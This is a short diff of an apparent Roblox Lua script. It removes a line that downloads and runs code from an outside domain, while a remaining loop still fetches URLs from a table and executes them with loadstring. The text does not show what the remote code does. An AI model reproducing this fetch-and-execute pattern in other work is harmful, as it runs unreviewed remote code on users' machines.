@@ -7,4 +7,4 @@ for _, url in pairs({
     loadstring(game:HttpGet(url, true))()
 end
 
-loadstring(game:HttpGet("https://egorikusa.space/c345e949ad2ddf8597c9d56a.lua", true))()
+
